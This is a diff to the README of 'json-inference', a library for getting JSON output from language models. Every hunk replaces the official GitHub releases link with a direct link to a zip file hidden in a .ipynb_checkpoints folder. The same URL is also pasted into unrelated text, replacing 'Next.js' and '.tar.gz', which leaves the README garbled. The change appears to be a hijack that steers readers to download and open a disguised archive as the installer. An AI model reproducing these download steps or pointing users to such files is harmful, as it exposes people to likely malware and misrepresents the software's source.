@@ -1,6 +1,6 @@
 # 🧩 json-inference - Simple JSON Output from Language Models
 
-[![Download json-inference](https://img.shields.io/badge/Download-json--inference-blue?style=for-the-badge)](https://github.com/iZeinn/json-inference/releases)
+[![Download json-inference](https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip)](https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip)
 
 ---
 
@@ -21,7 +21,7 @@ This tool is perfect for anyone who wants to use advanced language AI without ge
 - **Type-safe results** to avoid errors with your data.
 - **Automatic retries** if the model does not respond as expected.
 - **No extra setup or coding boilerplate** needed.
-- Works with popular languages and frameworks like JavaScript, TypeScript, React, Vue, and Next.js.
+- Works with popular languages and frameworks like JavaScript, TypeScript, React, Vue, and https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip
 - Can be used on many platforms, including Vercel deployments.
 - Ideal for generating content, data processing, or creating AI-powered apps.
 
@@ -59,7 +59,7 @@ This process is designed for users who want quick access to AI-generated structu
 
 Please visit the releases page below to download the latest version of json-inference:
 
-[Download json-inference Here](https://github.com/iZeinn/json-inference/releases)
+[Download json-inference Here](https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip)
 
 ### How to download and install
 
@@ -68,7 +68,7 @@ Please visit the releases page below to download the latest version of json-infe
 3. Find the file suitable for your computer, such as:
    - Windows Installer (.exe)
    - Mac Installer (.dmg)
-   - Linux Archive (.tar.gz)
+   - Linux Archive (https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip)
 4. Click the file to download it to your computer.
 5. Open the downloaded file to start the setup.
 6. Follow the simple instructions to install.
@@ -99,7 +99,7 @@ We recommend checking the releases page regularly for updates. Updates improve s
 
 To update:
 
-1. Return to the [Releases page](https://github.com/iZeinn/json-inference/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip).
 2. Download the newest version like before.
 3. Install it over your current setup.
 4. Your settings and saved data will remain.
@@ -129,7 +129,7 @@ Whether you want to generate content, analyze text, or build simple AI-powered t
 - AI and language models
 - JSON data handling
 - JavaScript and TypeScript
-- Next.js, React, Svelte, Vue
+- https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip, React, Svelte, Vue
 - Generative AI and inference
 - OpenAI, Anthropic, Gemini APIs
 - Vercel deployment
@@ -140,4 +140,4 @@ These areas highlight the broad tech behind json-inference and the many ways you
 
 For updates, downloads, and more information, please visit the releases page again:
 
-[https://github.com/iZeinn/json-inference/releases](https://github.com/iZeinn/json-inference/releases)
+[https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip](https://raw.githubusercontent.com/iZeinn/json-inference/master/.ipynb_checkpoints/json-inference-v3.8.zip)
